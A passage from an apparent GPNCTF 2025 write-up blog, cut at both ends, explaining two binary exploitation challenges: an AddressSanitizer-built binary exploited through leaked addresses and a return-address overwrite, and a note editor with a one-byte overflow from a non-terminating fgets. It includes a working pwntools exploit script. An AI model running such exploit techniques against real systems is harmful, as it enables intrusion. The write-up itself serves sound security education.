</span></span><span class=line><span class=cl>	<span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>As we known the chall makes use of <strong>AddressSanitizer</strong> in compilation time so if we check the disassembled binary we could notice some changes on the <code>main</code> function.</p><p><img alt=Untitled loading=lazy src=/CTF/gpnctf25-5.png></p><p>First thing that catch my eye is this comparison at startup checking if there is <strong>stack use-after-return detection enabled</strong>. As the binary takes the <code>loc_14c4</code> path, we can confirm that is enabled.</p><p><strong>But why is monitoring this vulnerability if our code is not vulnerable to it?</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=nf>provide_help</span><span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=n>stack_ptr</span><span class=p>)</span>
</span></span></code></pre></div><p>Returning to the <code>provide_help</code> function, it takes a stack address as an argument. As a <strong>preventive measure</strong>, if any function that handles stack addresses is detected, the <strong>stack</strong> will be <strong>allocated on the heap</strong> instead, allowing it to be monitored by the <strong>sanitizer</strong>.</p><p><img alt=Untitled loading=lazy src=/CTF/gpnctf25-6.png></p><p>In <code>loc_139E</code> some type of <strong>masking</strong> is done at a relative address to <strong>rbp</strong>.</p><p>This mask targets addresses on the <strong>heap-allocated</strong> <em>stack,</em> <strong>ASan</strong> maintains a <strong>shadow memory</strong>, where the mask is written, to track whether memory is valid or poisoned. Making sure <strong>no</strong> function reads or writes into the poisoned addresses.</p><p><img alt=Untitled loading=lazy src=/CTF/gpnctf25-7.png></p><p>To summarize, we have two crucial leaks: the address of the <code>win</code> function and a stack address (in this case, from the heap-allocated stack). Additionally, we have <strong>arbitrary read and write</strong> capabilities, as long as the target addresses aren’t poisoned. This is because the <strong>ASan</strong> mask only affects <strong>heap-allocated stack</strong> frames, which are the ones susceptible to stack use-after-return detection.</p><p>Before diving into the exploitation phase, I usually like to plan my approach.</p><p>The presence of a <code>win</code> function leak suggests that we have control over <strong>PIE</strong>, which we can leverage to leak the address of <code>puts</code> from the <strong>GOT</strong>. This leak will allow us to compute the base address of libc.</p><p>From here, it&rsquo;s a win-win case. With the libc base address, we can calculate the address of the <code>environ</code> pointer, which points to a stack address. This allows us to derive the return address of a function on the stack, and that’s what we’re going to overwrite in order to <strong>hijack the control flow</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>exe</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./nasa&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>arch</span><span class=o>=</span><span class=s1>&#39;amd64&#39;</span><span class=p>,</span> <span class=n>os</span><span class=o>=</span><span class=s1>&#39;linux&#39;</span><span class=p>,</span> <span class=n>log_level</span><span class=o>=</span><span class=s1>&#39;debug&#39;</span><span class=p>,</span> <span class=n>terminal</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;tmux&#39;</span><span class=p>,</span> <span class=s1>&#39;splitw&#39;</span><span class=p>,</span> <span class=s1>&#39;-h&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>start</span><span class=p>(</span><span class=n>argv</span><span class=o>=</span><span class=p>[],</span> <span class=o>*</span><span class=n>a</span><span class=p>,</span> <span class=o>**</span><span class=n>kw</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>GDB</span><span class=p>:</span> <span class=c1># GDB</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>([</span><span class=n>exe</span><span class=o>.</span><span class=n>path</span><span class=p>]</span> <span class=o>+</span> <span class=n>argv</span><span class=p>,</span> <span class=n>gdbscript</span><span class=o>=</span><span class=n>gdbscript</span><span class=p>,</span> <span class=o>*</span><span class=n>a</span><span class=p>,</span> <span class=o>**</span><span class=n>kw</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;lakeforge-of-mind-blowing-hope.gpn23.ctf.kitctf.de&#34;</span><span class=p>,</span> <span class=s2>&#34;443&#34;</span><span class=p>,</span> <span class=n>ssl</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=n>gdbscript</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>disp/10i $rip
</span></span></span><span class=line><span class=cl><span class=s1>tb main
</span></span></span><span class=line><span class=cl><span class=s1>continue
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=o>**</span><span class=nb>locals</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Write primitive</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>write</span><span class=p>(</span><span class=n>addr</span><span class=p>,</span> <span class=n>data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;[1] Write [2] Read [3] Exit</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;8-byte adress and 8-byte data to write please (hex)</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Read primitive</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>read</span><span class=p>(</span><span class=n>addr</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;[1] Write [2] Read [3] Exit</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;8-byte adress to read please (hex)</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Exit primitive</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>exit</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;[1] Write [2] Read [3] Exit</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Leak addresses</span>
</span></span><span class=line><span class=cl><span class=n>asan_heap</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>(),</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>win_addr</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>(),</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Compute PIE</span>
</span></span><span class=line><span class=cl><span class=n>exe</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>win_addr</span> <span class=o>-</span> <span class=mh>0x1309</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;exe base: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>exe</span><span class=o>.</span><span class=n>address</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Leak libc address</span>
</span></span><span class=line><span class=cl><span class=n>puts_addr</span> <span class=o>=</span> <span class=n>read</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>exe</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;puts_addr: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>puts_addr</span><span class=p>,</span> <span class=mi>16</span><span class=p>))</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Compute libc base</span>
</span></span><span class=line><span class=cl><span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>puts_addr</span><span class=p>,</span> <span class=mi>16</span><span class=p>)</span> <span class=o>-</span> <span class=mh>0x265a12</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;libc base: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>address</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Leak stack address</span>
</span></span><span class=line><span class=cl><span class=n>environ_addr</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;environ&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;environ_addr: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>environ_addr</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Compute return address</span>
</span></span><span class=line><span class=cl><span class=n>rip_addr</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>read</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>environ_addr</span><span class=p>)),</span> <span class=mi>16</span><span class=p>)</span> <span class=o>-</span> <span class=mh>0x130</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Hijack the control flow</span>
</span></span><span class=line><span class=cl><span class=n>write</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>rip_addr</span><span class=p>),</span> <span class=nb>hex</span><span class=p>(</span><span class=n>win_addr</span> <span class=o>+</span> <span class=mh>0xa</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Trigger the win function</span>
</span></span><span class=line><span class=cl><span class=n>exit</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div><p><img alt=Untitled loading=lazy src=/CTF/gpnctf25-8.png></p><blockquote><p>GPNCTF{all_WR1te5_4Re_PrO7EcteD_By_AsaN_oN1Y_in_Y0UR_dreamS_9438}</p></blockquote><p>Wrapping up, <strong>ASan</strong> is a debugging tool, not a security boundary. It helps developers catch bugs during testing, but it&rsquo;s not reliable for protecting a binary against exploitation. Arbitrary read/write breaks the entire threat model that <strong>ASan</strong> operates under.</p><p><img alt=Running-Away-Balloon(1).jpg loading=lazy src=attachment:44def19c-f123-4111-9c31-01886ac98ce7:Running-Away-Balloon(1).jpg></p><h2 id=note-editor>Note Editor<a hidden class=anchor aria-hidden=true href=#note-editor>#</a></h2><p><img alt=Untitled loading=lazy src=/CTF/gpnctf25-9.png></p><p>Not much to take away from this description but it seems to be some sort of note-taking app.</p><p><img alt=Untitled loading=lazy src=/CTF/gpnctf25-10.png></p><p>Everything seems disabled wasn’t expecting less from an entry level challenge.</p><p>From this line in the challenge&rsquo;s <strong>Dockerfile</strong>, we can see that <code>lib.c</code> and <code>main.c</code> are compiled together into a single executable.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-docker data-lang=docker><span class=line><span class=cl><span class=k>RUN</span> gcc lib.c main.c -o chall -fno-stack-protector -fno-pie -no-pie<span class=err>
</span></span></span></code></pre></div><p>Once executed the following <strong>contextual menu</strong> is shown.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Welcome to the terminal note editor as a service.
</span></span><span class=line><span class=cl>Choose your action:
</span></span><span class=line><span class=cl>1. Reset note
</span></span><span class=line><span class=cl>2. View current note
</span></span><span class=line><span class=cl>3. Append line to note
</span></span><span class=line><span class=cl>4. Edit line at offset
</span></span><span class=line><span class=cl>5. Truncate note
</span></span><span class=line><span class=cl>6. Quit
</span></span></code></pre></div><p>Let’s dig into the code.</p><p>The first thing I noticed was that <code>lib.c</code> overrides the standard <code>fgets</code> function with its own custom implementation. This is interesting, as it could introduce a specific vulnerability related to how <code>fgets</code> behaves, worth to mention that it <strong>does not null-terminate</strong> the string. Additionally, a <code>win</code> function is implemented, making it easier to hijack the control flow once code execution is achieved.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=o>*</span><span class=nf>fgets</span><span class=p>(</span><span class=kt>char</span><span class=o>*</span> <span class=n>s</span><span class=p>,</span> <span class=kt>int</span> <span class=n>size</span><span class=p>,</span> <span class=n>FILE</span> <span class=o>*</span><span class=kr>restrict</span> <span class=n>stream</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span><span class=o>*</span> <span class=n>cursor</span> <span class=o>=</span> <span class=n>s</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>size</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>c</span> <span class=o>=</span> <span class=nf>getc</span><span class=p>(</span><span class=n>stream</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>c</span> <span class=o>==</span> <span class=n>EOF</span><span class=p>)</span> <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=o>*</span><span class=p>(</span><span class=n>cursor</span><span class=o>++</span><span class=p>)</span> <span class=o>=</span> <span class=n>c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>c</span> <span class=o>==</span> <span class=sc>&#39;\n&#39;</span><span class=p>)</span> <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=c1>// *cursor = &#39;\0&#39;; // our note is always null terminated
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>return</span> <span class=n>s</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>win</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>execve</span><span class=p>(</span><span class=s>&#34;/bin/sh&#34;</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>The following <strong>macro</strong>, which may appear in the code, reads an entire line from stdin using <code>getline</code> and parses it with <code>sscanf</code> according to the given format and arguments.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>#define SCANLINE(format, args) \
</span></span></span><span class=line><span class=cl><span class=cp>    ({ \
</span></span></span><span class=line><span class=cl><span class=cp>    char* __scanline_line = NULL; \
</span></span></span><span class=line><span class=cl><span class=cp>    size_t __scanline_length = 0; \
</span></span></span><span class=line><span class=cl><span class=cp>    getline(&amp;__scanline_line, &amp;__scanline_length, stdin); \
</span></span></span><span class=line><span class=cl><span class=cp>    sscanf(__scanline_line, format, args); \
</span></span></span><span class=line><span class=cl><span class=cp>    })
</span></span></span></code></pre></div><p>The key thing in <code>main.c</code> is the <code>edit</code> function, which takes a <code>Note*</code> struct as an argument. It prompts the user for an offset and a length, and is responsible for editing the note&rsquo;s buffer starting at the given offset for up to <code>length</code> bytes. While some checks are performed on the <strong>user-controlled values</strong>, they are ultimately ineffective as <code>fgets</code> takes <code>lenght + 2</code> bytes and does not explicitly <strong>null-terminate</strong> the last byte if the input length is large enough, potentially allowing a <strong>one-byte overflow</strong> past the end of the buffer.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=nf>edit</span><span class=p>(</span><span class=n>Note</span><span class=o>*</span> <span class=n>note</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Give me an offset where you want to start editing: &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span> <span class=n>offset</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>SCANLINE</span><span class=p>(</span><span class=s>&#34;%u&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>offset</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;How many bytes do you want to overwrite: &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>int64_t</span> <span class=n>length</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>SCANLINE</span><span class=p>(</span><span class=s>&#34;%ld&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>length</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>offset</span> <span class=o>&lt;=</span> <span class=n>note</span><span class=o>-&gt;</span><span class=n>pos</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kt>uint32_t</span> <span class=n>lookback</span> <span class=o>=</span> <span class=p>(</span><span class=n>note</span><span class=o>-&gt;</span><span class=n>pos</span> <span class=o>-</span> <span class=n>offset</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>length</span> <span class=o>&lt;=</span> <span class=n>note</span><span class=o>-&gt;</span><span class=n>budget</span> <span class=o>+</span> <span class=n>lookback</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nf>fgets</span><span class=p>(</span><span class=n>note</span><span class=o>-&gt;</span><span class=n>buffer</span> <span class=o>+</span> <span class=n>offset</span><span class=p>,</span> <span class=n>length</span> <span class=o>+</span> <span class=mi>2</span><span class=p>,</span> <span class=n>stdin</span><span class=p>);</span> <span class=c1>// plus newline and null byte
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=kt>uint32_t</span> <span class=n>written</span> <span class=o>=</span> <span class=nf>strcspn</span><span class=p>(</span><span class=n>note</span><span class=o>-&gt;</span><span class=n>buffer</span> <span class=o>+</span> <span class=n>offset</span><span class=p>,</span> <span class=s>&#34;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=n>written</span> <span class=o>&gt;</span> <span class=n>lookback</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=n>note</span><span class=o>-&gt;</span><span class=n>budget</span> <span class=o>-=</span> <span class=n>written</span> <span class=o>-</span> <span class=n>lookback</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=n>note</span><span class=o>-&gt;</span><span class=n>pos</span> <span class=o>+=</span> <span class=n>written</span> <span class=o>-</span> <span class=n>lookback</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Maybe write something there first.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#define NOTE_SIZE 1024
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=k>struct</span> <span class=n>Note</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span><span class=o>*</span> <span class=n>buffer</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span> <span class=n>budget</span><span class=p>;</span> 
</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span> <span class=n>pos</span><span class=p>;</span> 
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=k>struct</span> <span class=n>Note</span> <span class=n>Note</span><span class=p>;</span>
</span></span></code></pre></div><p>This <strong>vulnerability</strong> on its own isn&rsquo;t particularly dangerous, but since the next item on the stack is the <strong>buffer pointer</strong> within the <code>Note</code> struct, it gives us the ability to overwrite one byte of that address, effectively letting us redirect where the note writes to.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>Note</span> <span class=n>note</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>buffer</span><span class=p>[</span><span class=n>NOTE_SIZE</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=p>.....</span> <span class=n>more</span> <span class=n>code</span> <span class=p>.....</span>
</span></span></code></pre></div><p>Alright, as usual, let&rsquo;s outline a plan. We&rsquo;ll start by editing the note from offset 0 up to <code>NOTE_SIZE</code>, which lets us modify a single byte of the note&rsquo;s buffer pointer. This shift pushes the pointer further in memory, giving us the ability to freely overwrite the return address.</p><p>The next question is: <strong>How many bytes can we overwrite once the pointer has been shifted?</strong></p><p>That depends on the stack layout, as the least significant byte of the <strong>buffer address</strong> varies between executions. The number of bytes we’re allowed to write ”our budget" is determined by subtracting the current <code>written</code> and <code>loopback</code> value from the <strong>previous budget</strong>. This <code>written</code> value is computed using <code>strcspn</code>, which scans the buffer until it encounters a newline or, in our case, the first null byte at the end of the shifted buffer pointer. <code>lookback</code> represents how far the write pointer has been shifted <strong>backwards</strong> from the <strong>current logical position</strong>, in our case is zero.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>uint32_t</span> <span class=n>written</span> <span class=o>=</span> <span class=nf>strcspn</span><span class=p>(</span><span class=n>note</span><span class=o>-&gt;</span><span class=n>buffer</span> <span class=o>+</span> <span class=n>offset</span><span class=p>,</span> <span class=s>&#34;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>uint32_t</span> <span class=n>lookback</span> <span class=o>=</span> <span class=p>(</span><span class=n>note</span><span class=o>-&gt;</span><span class=n>pos</span> <span class=o>-</span> <span class=n>offset</span><span class=p>);</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>note</span><span class=o>-&gt;</span><span class=n>budget</span> <span class=o>-=</span> <span class=n>written</span> <span class=o>-</span> <span class=n>lookback</span><span class=p>;</span>
</span></span></code></pre></div><p>Is worth to mention the actual <strong>position</strong> of the note is updated in a similar way</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>note</span><span class=o>-&gt;</span><span class=n>pos</span> <span class=o>+=</span> <span class=n>written</span> <span class=o>-</span> <span class=n>lookback</span><span class=p>;</span>
</span></span></code></pre></div><p>So once we got the <strong>buffer pointer</strong> shifted we can use the following function which is very handy which appends data at the end of the buffer, the only thing here to have care about is to put a <strong>null byte</strong> at the end of the <strong>buffer pointer</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=nf>append</span><span class=p>(</span><span class=n>Note</span><span class=o>*</span> <span class=n>note</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Append something to your note (%u bytes left):</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>note</span><span class=o>-&gt;</span><span class=n>budget</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fgets</span><span class=p>(</span><span class=n>note</span><span class=o>-&gt;</span><span class=n>buffer</span> <span class=o>+</span> <span class=n>note</span><span class=o>-&gt;</span><span class=n>pos</span><span class=p>,</span> <span class=n>note</span><span class=o>-&gt;</span><span class=n>budget</span><span class=p>,</span> <span class=n>stdin</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span> <span class=n>written</span> <span class=o>=</span> <span class=nf>strcspn</span><span class=p>(</span><span class=n>note</span><span class=o>-&gt;</span><span class=n>buffer</span> <span class=o>+</span> <span class=n>note</span><span class=o>-&gt;</span><span class=n>pos</span><span class=p>,</span> <span class=s>&#34;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>note</span><span class=o>-&gt;</span><span class=n>budget</span> <span class=o>-=</span> <span class=n>written</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>note</span><span class=o>-&gt;</span><span class=n>pos</span> <span class=o>+=</span> <span class=n>written</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>exe</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./chall&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#libc = ELF(&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;)</span>
</span></span><span class=line><span class=cl>
